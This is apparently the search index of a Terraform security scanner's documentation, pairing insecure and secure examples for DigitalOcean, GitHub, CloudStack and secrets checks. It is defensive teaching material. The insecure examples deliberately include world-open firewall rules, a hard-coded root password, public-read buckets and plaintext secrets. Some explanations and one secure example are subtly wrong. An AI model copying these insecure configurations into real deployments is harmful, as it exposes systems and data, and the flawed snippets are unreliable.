}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/cloudstack/compute/no-sensitive-info/#secure-example","text":"<p>The following example will pass the cloudstack-compute-no-sensitive-info check. <pre><code> resource \"cloudstack_instance\" \"web\" {\n   name             = \"server-1\"\n   service_offering = \"small\"\n   network_id       = \"6eb22f91-7454-4107-89f4-36afcdf33021\"\n   template         = \"CentOS 6.5\"\n   zone             = \"zone-1\"\n   user_data        = &lt;&lt;EOF\n export GREETING=\"Hello there\"\n EOF\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/cloudstack/compute/no-sensitive-info/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/cloudstack/latest/docs/resources/instance#</li> </ul>","title":"Links"},{"location":"checks/digitalocean/","text":"","title":"digitalocean"},{"location":"checks/digitalocean/#services","text":"<ul> <li> <p>compute</p> </li> <li> <p>spaces</p> </li> </ul>","title":"Services"},{"location":"checks/digitalocean/compute/","text":"","title":"compute"},{"location":"checks/digitalocean/compute/#checks","text":"<ul> <li> <p>enforce-https The load balancer forwarding rule is using an insecure protocol as an entrypoint</p> </li> <li> <p>kubernetes-auto-upgrades-not-enabled Kubernetes clusters should be auto-upgraded to ensure that they always contain the latest security patches.</p> </li> <li> <p>no-public-egress The firewall has an outbound rule with open access</p> </li> <li> <p>no-public-ingress The firewall has an inbound rule with open access</p> </li> <li> <p>surge-upgrades-not-enabled The Kubernetes cluster does not enable surge upgrades</p> </li> <li> <p>use-ssh-keys SSH Keys are the preferred way to connect to your droplet, no keys are supplied</p> </li> </ul>","title":"Checks"},{"location":"checks/digitalocean/compute/enforce-https/","text":"","title":"The load balancer forwarding rule is using an insecure protocol as an entrypoint"},{"location":"checks/digitalocean/compute/enforce-https/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/digitalocean/compute/enforce-https/#explanation","text":"<p>Plain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.</p> <p>You should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.</p>","title":"Explanation"},{"location":"checks/digitalocean/compute/enforce-https/#possible-impact","text":"<p>Your inbound traffic is not protected</p>","title":"Possible Impact"},{"location":"checks/digitalocean/compute/enforce-https/#suggested-resolution","text":"<p>Switch to HTTPS to benefit from TLS security features</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/compute/enforce-https/#insecure-example","text":"<p>The following example will fail the digitalocean-compute-enforce-https check. <pre><code> resource \"digitalocean_loadbalancer\" \"bad_example\" {\n   name   = \"bad_example-1\"\n   region = \"nyc3\"\n\n   forwarding_rule {\n     entry_port     = 80\n     entry_protocol = \"http\"\n\n     target_port     = 80\n     target_protocol = \"http\"\n   }\n\n   droplet_ids = [digitalocean_droplet.web.id]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/compute/enforce-https/#secure-example","text":"<p>The following example will pass the digitalocean-compute-enforce-https check. <pre><code> resource \"digitalocean_loadbalancer\" \"bad_example\" {\n   name   = \"bad_example-1\"\n   region = \"nyc3\"\n\n   forwarding_rule {\n    entry_port     = 443\n    entry_protocol = \"https\"\n\n    target_port     = 443\n    target_protocol = \"https\"\n   }\n\n   droplet_ids = [digitalocean_droplet.web.id]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/compute/enforce-https/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/loadbalancer</p> </li> <li> <p>https://docs.digitalocean.com/products/networking/load-balancers/</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/","text":"","title":"Kubernetes clusters should be auto-upgraded to ensure that they always contain the latest security patches."},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#explanation","text":"","title":"Explanation"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#possible-impact","text":"<p>Not running the latest security patches on your Kubernetes cluster can make it a target for penetration.</p>","title":"Possible Impact"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#suggested-resolution","text":"<p>Set maintenance policy deterministically when auto upgrades are enabled</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#insecure-example","text":"<p>The following example will fail the digitalocean-compute-kubernetes-auto-upgrades-not-enabled check. <pre><code>resource \"digitalocean_kubernetes_cluster\" \"foo\" {\n    name         = \"foo\"\n    region       = \"nyc1\"\n    version      = \"1.20.2-do.0\"\n    auto_upgrade = false\n\n    node_pool {\n        name       = \"autoscale-worker-pool\"\n        size       = \"s-2vcpu-2gb\"\n        auto_scale = true\n        min_nodes  = 1\n        max_nodes  = 5\n    }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#secure-example","text":"<p>The following example will pass the digitalocean-compute-kubernetes-auto-upgrades-not-enabled check. <pre><code>resource \"digitalocean_kubernetes_cluster\" \"foo\" {\n    name         = \"foo\"\n    region       = \"nyc1\"\n    version      = \"1.20.2-do.0\"\n    auto_upgrade = true\n\n    node_pool {\n        name       = \"autoscale-worker-pool\"\n        size       = \"s-2vcpu-2gb\"\n        auto_scale = true\n        min_nodes  = 1\n        max_nodes  = 5\n    }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/kubernetes_cluster#auto-upgrade-example</p> </li> <li> <p>https://docs.digitalocean.com/products/kubernetes/resources/best-practices/</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/compute/no-public-egress/","text":"","title":"The firewall has an outbound rule with open access"},{"location":"checks/digitalocean/compute/no-public-egress/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/digitalocean/compute/no-public-egress/#explanation","text":"<p>Opening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/digitalocean/compute/no-public-egress/#possible-impact","text":"<p>The port is exposed for ingress from the internet</p>","title":"Possible Impact"},{"location":"checks/digitalocean/compute/no-public-egress/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/compute/no-public-egress/#insecure-example","text":"<p>The following example will fail the digitalocean-compute-no-public-egress check. <pre><code> resource \"digitalocean_firewall\" \"bad_example\" {\n    name = \"only-22-80-and-443\"\n\n    droplet_ids = [digitalocean_droplet.web.id]\n\n    outbound_rule {\n      protocol         = \"tcp\"\n      port_range       = \"22\"\n      destination_addresses = [\"0.0.0.0/0\", \"::/0\"]\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/compute/no-public-egress/#secure-example","text":"<p>The following example will pass the digitalocean-compute-no-public-egress check. <pre><code> resource \"digitalocean_firewall\" \"good_example\" {\n    name = \"only-22-80-and-443\"\n\n    droplet_ids = [digitalocean_droplet.web.id]\n\n    outbound_rule {\n      protocol         = \"tcp\"\n      port_range       = \"22\"\n      destination_addresses = [\"192.168.1.0/24\", \"fc00::/7\"]\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/compute/no-public-egress/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/firewall</p> </li> <li> <p>https://docs.digitalocean.com/products/networking/firewalls/how-to/configure-rules/</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/compute/no-public-ingress/","text":"","title":"The firewall has an inbound rule with open access"},{"location":"checks/digitalocean/compute/no-public-ingress/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/digitalocean/compute/no-public-ingress/#explanation","text":"<p>Opening up ports to connect out to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that are explicitly required where possible.</p>","title":"Explanation"},{"location":"checks/digitalocean/compute/no-public-ingress/#possible-impact","text":"<p>Your port is exposed to the internet</p>","title":"Possible Impact"},{"location":"checks/digitalocean/compute/no-public-ingress/#suggested-resolution","text":"<p>Set a more restrictive CIRDR range</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/compute/no-public-ingress/#insecure-example","text":"<p>The following example will fail the digitalocean-compute-no-public-ingress check. <pre><code> resource \"digitalocean_firewall\" \"bad_example\" {\n    name = \"only-22-80-and-443\"\n\n    droplet_ids = [digitalocean_droplet.web.id]\n\n    inbound_rule {\n      protocol         = \"tcp\"\n      port_range       = \"22\"\n      source_addresses = [\"0.0.0.0/0\", \"::/0\"]\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/compute/no-public-ingress/#secure-example","text":"<p>The following example will pass the digitalocean-compute-no-public-ingress check. <pre><code> resource \"digitalocean_firewall\" \"good_example\" {\n    name = \"only-22-80-and-443\"\n\n    droplet_ids = [digitalocean_droplet.web.id]\n\n    inbound_rule {\n      protocol         = \"tcp\"\n      port_range       = \"22\"\n      source_addresses = [\"192.168.1.0/24\", \"fc00::/7\"]\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/compute/no-public-ingress/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/firewall</p> </li> <li> <p>https://docs.digitalocean.com/products/networking/firewalls/how-to/configure-rules/</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/","text":"","title":"The Kubernetes cluster does not enable surge upgrades"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#explanation","text":"<p>While upgrading your cluster, workloads will temporarily be moved to new nodes. A small cost will follow, but as a bonus, you won't experience downtime.</p>","title":"Explanation"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#possible-impact","text":"<p>Upgrades may influence availability of your Kubernetes cluster</p>","title":"Possible Impact"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#suggested-resolution","text":"<p>Enable surge upgrades in your Kubernetes cluster</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#insecure-example","text":"<p>The following example will fail the digitalocean-compute-surge-upgrades-not-enabled check. <pre><code>resource \"digitalocean_kubernetes_cluster\" \"surge_upgrade_bad\" {\n    name   = \"foo\"\n    region = \"nyc1\"\n    version = \"1.20.2-do.0\"\n    surge_upgrade = false\n\n    node_pool {\n        name       = \"worker-pool\"\n        size       = \"s-2vcpu-2gb\"\n        node_count = 3\n\n        taint {\n            key    = \"workloadKind\"\n            value  = \"database\"\n            effect = \"NoSchedule\"\n        }\n    }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#secure-example","text":"<p>The following example will pass the digitalocean-compute-surge-upgrades-not-enabled check. <pre><code>resource \"digitalocean_kubernetes_cluster\" \"surge_upgrade_good\" {\n    name   = \"foo\"\n    region = \"nyc1\"\n    version = \"1.20.2-do.0\"\n    surge_upgrade = true\n\n    node_pool {\n        name       = \"worker-pool\"\n        size       = \"s-2vcpu-2gb\"\n        node_count = 3\n\n        taint {\n            key    = \"workloadKind\"\n            value  = \"database\"\n            effect = \"NoSchedule\"\n        }\n    }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/compute/surge-upgrades-not-enabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/kubernetes_cluster#surge_upgrade</p> </li> <li> <p>https://docs.digitalocean.com/products/kubernetes/how-to/upgrade-cluster/#surge-upgrades</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/compute/use-ssh-keys/","text":"","title":"SSH Keys are the preferred way to connect to your droplet, no keys are supplied"},{"location":"checks/digitalocean/compute/use-ssh-keys/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/digitalocean/compute/use-ssh-keys/#explanation","text":"<p>When working with a server, you\u2019ll likely spend most of your time in a terminal session connected to your server through SSH. A more secure alternative to password-based logins, SSH keys use encryption to provide a secure way of logging into your server and are recommended for all users.</p>","title":"Explanation"},{"location":"checks/digitalocean/compute/use-ssh-keys/#possible-impact","text":"<p>Logging in with username and password is easier to compromise</p>","title":"Possible Impact"},{"location":"checks/digitalocean/compute/use-ssh-keys/#suggested-resolution","text":"<p>Use ssh keys for login</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/compute/use-ssh-keys/#insecure-example","text":"<p>The following example will fail the digitalocean-compute-use-ssh-keys check. <pre><code> resource \"digitalocean_droplet\" \"good_example\" {\n    image    = \"ubuntu-18-04-x64\"\n    name     = \"web-1\"\n    region   = \"nyc2\"\n    size     = \"s-1vcpu-1gb\"\n  }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/compute/use-ssh-keys/#secure-example","text":"<p>The following example will pass the digitalocean-compute-use-ssh-keys check. <pre><code> data \"digitalocean_ssh_key\" \"terraform\" {\n    name = \"myKey\"\n   }\n\n resource \"digitalocean_droplet\" \"good_example\" {\n    image    = \"ubuntu-18-04-x64\"\n    name     = \"web-1\"\n    region   = \"nyc2\"\n    size     = \"s-1vcpu-1gb\"\n    ssh_keys = [ data.digitalocean_ssh_key.myKey.id ]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/compute/use-ssh-keys/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/droplet#ssh_keys</p> </li> <li> <p>https://www.digitalocean.com/community/tutorials/understanding-the-ssh-encryption-and-connection-process</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/spaces/","text":"","title":"spaces"},{"location":"checks/digitalocean/spaces/#checks","text":"<ul> <li> <p>acl-no-public-read Spaces bucket or bucket object has public read acl set</p> </li> <li> <p>disable-force-destroy Force destroy is enabled on Spaces bucket which is dangerous</p> </li> <li> <p>versioning-enabled Spaces buckets should have versioning enabled</p> </li> </ul>","title":"Checks"},{"location":"checks/digitalocean/spaces/acl-no-public-read/","text":"","title":"Spaces bucket or bucket object has public read acl set"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#explanation","text":"<p>Space bucket and bucket object permissions should be set to deny public access unless explicitly required.</p>","title":"Explanation"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#possible-impact","text":"<p>The contents of the space can be accessed publicly</p>","title":"Possible Impact"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#suggested-resolution","text":"<p>Apply a more restrictive ACL</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#insecure-example","text":"<p>The following example will fail the digitalocean-spaces-acl-no-public-read check. <pre><code> resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   = \"public_space\"\n   region = \"nyc3\"\n   acl    = \"public-read\"\n }\n\n resource \"digitalocean_spaces_bucket_object\" \"index\" {\n   region       = digitalocean_spaces_bucket.bad_example.region\n   bucket       = digitalocean_spaces_bucket.bad_example.name\n   key          = \"index.html\"\n   content      = \"&lt;html&gt;&lt;body&gt;&lt;p&gt;This page is empty.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\"\n   content_type = \"text/html\"\n   acl          = \"public-read\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#secure-example","text":"<p>The following example will pass the digitalocean-spaces-acl-no-public-read check. <pre><code> resource \"digitalocean_spaces_bucket\" \"good_example\" {\n   name   = \"private_space\"\n   region = \"nyc3\"\n   acl    = \"private\"\n }\n\n resource \"digitalocean_spaces_bucket_object\" \"index\" {\n   region       = digitalocean_spaces_bucket.good_example.region\n   bucket       = digitalocean_spaces_bucket.good_example.name\n   key          = \"index.html\"\n   content      = \"&lt;html&gt;&lt;body&gt;&lt;p&gt;This page is empty.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\"\n   content_type = \"text/html\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/spaces/acl-no-public-read/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#acl</p> </li> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket_object#acl</p> </li> <li> <p>https://docs.digitalocean.com/reference/api/spaces-api/#access-control-lists-acls</p> </li> </ul>","title":"Links"},{"location":"checks/digitalocean/spaces/disable-force-destroy/","text":"","title":"Force destroy is enabled on Spaces bucket which is dangerous"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#explanation","text":"<p>Enabling force destroy on a Spaces bucket means that the bucket can be deleted without the additional check that it is empty. This risks important data being accidentally deleted by a bucket removal process.</p>","title":"Explanation"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#possible-impact","text":"<p>Accidental deletion of bucket objects</p>","title":"Possible Impact"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#suggested-resolution","text":"<p>Don't use force destroy on bucket configuration</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#insecure-example","text":"<p>The following example will fail the digitalocean-spaces-disable-force-destroy check. <pre><code> resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name         = \"foobar\"\n   region       = \"nyc3\"\n   force_destroy = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#secure-example","text":"<p>The following example will pass the digitalocean-spaces-disable-force-destroy check. <pre><code> resource \"digitalocean_spaces_bucket\" \"good_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/spaces/disable-force-destroy/#links","text":"<ul> <li>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#force_destroy</li> </ul>","title":"Links"},{"location":"checks/digitalocean/spaces/versioning-enabled/","text":"","title":"Spaces buckets should have versioning enabled"},{"location":"checks/digitalocean/spaces/versioning-enabled/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/digitalocean/spaces/versioning-enabled/#explanation","text":"<p>Versioning is a means of keeping multiple variants of an object in the same bucket. You can use the Spaces (S3) Versioning feature to preserve, retrieve, and restore every version of every object stored in your buckets. With versioning you can recover more easily from both unintended user actions and application failures.</p>","title":"Explanation"},{"location":"checks/digitalocean/spaces/versioning-enabled/#possible-impact","text":"<p>Deleted or modified data would not be recoverable</p>","title":"Possible Impact"},{"location":"checks/digitalocean/spaces/versioning-enabled/#suggested-resolution","text":"<p>Enable versioning to protect against accidental or malicious removal or modification</p>","title":"Suggested Resolution"},{"location":"checks/digitalocean/spaces/versioning-enabled/#insecure-example","text":"<p>The following example will fail the digitalocean-spaces-versioning-enabled check. <pre><code> resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n }\n\n resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n\n   versioning {\n    enabled = false \n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/digitalocean/spaces/versioning-enabled/#secure-example","text":"<p>The following example will pass the digitalocean-spaces-versioning-enabled check. <pre><code> resource \"digitalocean_spaces_bucket\" \"good_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n\n   versioning {\n    enabled = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/digitalocean/spaces/versioning-enabled/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#versioning</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html</p> </li> </ul>","title":"Links"},{"location":"checks/general/","text":"","title":"general"},{"location":"checks/general/#services","text":"<ul> <li>secrets</li> </ul>","title":"Services"},{"location":"checks/general/secrets/","text":"","title":"secrets"},{"location":"checks/general/secrets/#checks","text":"<ul> <li> <p>no-plaintext-exposure Secret/sensitive data should not be exposed in plaintext.</p> </li> <li> <p>no-plaintext-exposure Secret/sensitive data should not be exposed in plaintext.</p> </li> <li> <p>no-plaintext-exposure Secret/sensitive data should not be exposed in plaintext.</p> </li> <li> <p>no-plaintext-exposure Secret/sensitive data should not be exposed in plaintext.</p> </li> <li> <p>no-plaintext-exposure Secret/sensitive data should not be exposed in plaintext.</p> </li> </ul>","title":"Checks"},{"location":"checks/general/secrets/no-plaintext-exposure/","text":"","title":"Secret/sensitive data should not be exposed in plaintext."},{"location":"checks/general/secrets/no-plaintext-exposure/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/general/secrets/no-plaintext-exposure/#explanation","text":"<p>Plaintext secrets kept in source code or similar media mean sensitive data is exposed to any users/systems with access to the source code.</p>","title":"Explanation"},{"location":"checks/general/secrets/no-plaintext-exposure/#possible-impact","text":"<p>Sensitive data can be leaked to unauthorised people or systems.</p>","title":"Possible Impact"},{"location":"checks/general/secrets/no-plaintext-exposure/#suggested-resolution","text":"<p>Remove plaintext secrets and encrypt them within a secrets manager instead.</p>","title":"Suggested Resolution"},{"location":"checks/general/secrets/no-plaintext-exposure/#insecure-example","text":"<p>The following example will fail the general-secrets-no-plaintext-exposure check. <pre><code> variable \"password\" {\n   description = \"The root password for our VM\"\n   type        = string\n   default     = \"p4ssw0rd\"\n }\n\n resource \"evil_corp\" \"virtual_machine\" {\n    root_password = var.password\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/general/secrets/no-plaintext-exposure/#secure-example","text":"<p>The following example will pass the general-secrets-no-plaintext-exposure check. <pre><code> variable \"password\" {\n   description = \"The root password for our VM\"\n   type        = string\n }\n\n resource \"evil_corp\" \"virtual_machine\" {\n    root_password = var.password\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/general/secrets/no-plaintext-exposure/#links","text":"<ul> <li>https://www.terraform.io/docs/state/sensitive-data.html</li> </ul>","title":"Links"},{"location":"checks/github/","text":"","title":"github"},{"location":"checks/github/#services","text":"<ul> <li> <p>actions</p> </li> <li> <p>branch_protections</p> </li> <li> <p>repositories</p> </li> </ul>","title":"Services"},{"location":"checks/github/actions/","text":"","title":"actions"},{"location":"checks/github/actions/#checks","text":"<ul> <li>no-plain-text-action-secrets Ensure plaintext value is not used for GitHub Action Environment Secret.</li> </ul>","title":"Checks"},{"location":"checks/github/actions/no-plain-text-action-secrets/","text":"","title":"Ensure plaintext value is not used for GitHub Action Environment Secret."},{"location":"checks/github/actions/no-plain-text-action-secrets/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/github/actions/no-plain-text-action-secrets/#explanation","text":"<p>For the purposes of security, the contents of the plaintext_value field have been marked as sensitive to Terraform, but this does not hide it from state files. State should be treated as sensitive always.</p>","title":"Explanation"},{"location":"checks/github/actions/no-plain-text-action-secrets/#possible-impact","text":"<p>Unencrypted sensitive plaintext value can be easily accessible in code.</p>","title":"Possible Impact"},{"location":"checks/github/actions/no-plain-text-action-secrets/#suggested-resolution","text":"<p>Do not store plaintext values in your code but rather populate the encrypted_value using fields from a resource, data source or variable.</p>","title":"Suggested Resolution"},{"location":"checks/github/actions/no-plain-text-action-secrets/#insecure-example","text":"<p>The following example will fail the github-actions-no-plain-text-action-secrets check. <pre><code>resource \"github_actions_environment_secret\" \"bad_example\" {     \n    repository       = \"my repository name\"\n    environment       = \"my environment\"\n    secret_name       = \"my secret name\"\n    plaintext_value   = \"sensitive secret string\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/github/actions/no-plain-text-action-secrets/#secure-example","text":"<p>The following example will pass the github-actions-no-plain-text-action-secrets check. <pre><code>resource \"github_actions_environment_secret\" \"good_example\" {\n    repository       = \"my repository name\"\n    environment       = \"my environment\"\n    secret_name       = \"my secret name\"\n    encrypted_value   = var.some_encrypted_secret_string\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/github/actions/no-plain-text-action-secrets/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/integrations/github/latest/docs/resources/actions_environment_secret</p> </li> <li> <p>https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions</p> </li> <li> <p>https://registry.terraform.io/providers/integrations/github/latest/docs/resources/actions_environment_secret</p> </li> <li> <p>https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions</p> </li> </ul>","title":"Links"},{"location":"checks/github/branch_protections/","text":"","title":"branch_protections"},{"location":"checks/github/branch_protections/#checks","text":"<ul> <li>require_signed_commits GitHub branch protection does not require signed commits.</li> </ul>","title":"Checks"},{"location":"checks/github/branch_protections/require_signed_commits/","text":"","title":"GitHub branch protection does not require signed commits."},{"location":"checks/github/branch_protections/require_signed_commits/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/github/branch_protections/require_signed_commits/#explanation","text":"<p>GitHub branch protection should be set to require signed commits.</p> <p>You can do this by setting the <code>require_signed_commits</code> attribute to 'true'.</p>","title":"Explanation"},{"location":"checks/github/branch_protections/require_signed_commits/#possible-impact","text":"<p>Commits may not be verified and signed as coming from a trusted developer</p>","title":"Possible Impact"},{"location":"checks/github/branch_protections/require_signed_commits/#suggested-resolution","text":"<p>Require signed commits</p>","title":"Suggested Resolution"},{"location":"checks/github/branch_protections/require_signed_commits/#insecure-example","text":"<p>The following example will fail the github-branch_protections-require_signed_commits check. <pre><code> resource \"github_branch_protection\" \"good_example\" {\n   repository_id = \"example\"\n   pattern       = \"main\"\n\n   require_signed_commits = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/github/branch_protections/require_signed_commits/#secure-example","text":"<p>The following example will pass the github-branch_protections-require_signed_commits check. <pre><code> resource \"github_branch_protection\" \"good_example\" {\n   repository_id = \"example\"\n   pattern       = \"main\"\n\n   require_signed_commits = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/github/branch_protections/require_signed_commits/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/integrations/github/latest/docs/resources/branch_protection</p> </li> <li> <p>https://registry.terraform.io/providers/integrations/github/latest/docs/resources/branch_protection#require_signed_commits</p> </li> <li> <p>https://docs.github.com/en/authentication/managing-commit-signature-verification/about-commit-signature-verification</p> </li> <li> <p>https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/defining-the-mergeability-of-pull-requests/about-protected-branches#require-signed-commits</p> </li> </ul>","title":"Links"},{"location":"checks/github/repositories/","text":"","title":"repositories"},{"location":"checks/github/repositories/#checks","text":"<ul> <li> <p>enable_vulnerability_alerts GitHub repository has vulnerability alerts disabled.</p> </li> <li> <p>private Github repository shouldn't be public.</p> </li> </ul>","title":"Checks"},{"location":"checks/github/repositories/enable_vulnerability_alerts/","text":"","title":"GitHub repository has vulnerability alerts disabled."},{"location":"checks/github/repositories/enable_vulnerability_alerts/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/github/repositories/enable_vulnerability_alerts/#explanation","text":"<p>GitHub repository should be set to use vulnerability alerts.</p> <p>You can do this by setting the <code>vulnerability_alerts</code> attribute to 'true'.</p>","title":"Explanation"},{"location":"checks/github/repositories/enable_vulnerability_alerts/#possible-impact","text":"<p>Known vulnerabilities may not be discovered</p>","title":"Possible Impact"},{"location":"checks/github/repositories/enable_vulnerability_alerts/#suggested-resolution","text":"<p>Enable vulnerability alerts</p>","title":"Suggested Resolution"},{"location":"checks/github/repositories/enable_vulnerability_alerts/#insecure-example","text":"<p>The following example will fail the github-repositories-enable_vulnerability_alerts check. <pre><code> resource \"github_repository\" \"bad_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n\n   vulnerability_alerts = false\n\n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/github/repositories/enable_vulnerability_alerts/#secure-example","text":"<p>The following example will pass the github-repositories-enable_vulnerability_alerts check. <pre><code> resource \"github_repository\" \"good_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n\n   vulnerability_alerts = true\n\n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/github/repositories/enable_vulnerability_alerts/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/integrations/github/latest/docs/resources/repository</p> </li> <li> <p>https://docs.github.com/en/code-security/supply-chain-security/managing-vulnerabilities-in-your-projects-dependencies/about-alerts-for-vulnerable-dependencies</p> </li> </ul>","title":"Links"},{"location":"checks/github/repositories/private/","text":"","title":"Github repository shouldn't be public."},{"location":"checks/github/repositories/private/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/github/repositories/private/#explanation","text":"<p>Github repository should be set to be private.</p> <p>You can do this by either setting <code>private</code> attribute to 'true' or <code>visibility</code> attribute to 'internal' or 'private'.</p>","title":"Explanation"},{"location":"checks/github/repositories/private/#possible-impact","text":"<p>Anyone can read the contents of the GitHub repository and leak IP</p>","title":"Possible Impact"},{"location":"checks/github/repositories/private/#suggested-resolution","text":"<p>Make sensitive or commercially important repositories private</p>","title":"Suggested Resolution"},{"location":"checks/github/repositories/private/#insecure-example","text":"<p>The following example will fail the github-repositories-private check. <pre><code> resource \"github_repository\" \"bad_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n\n   visibility  = 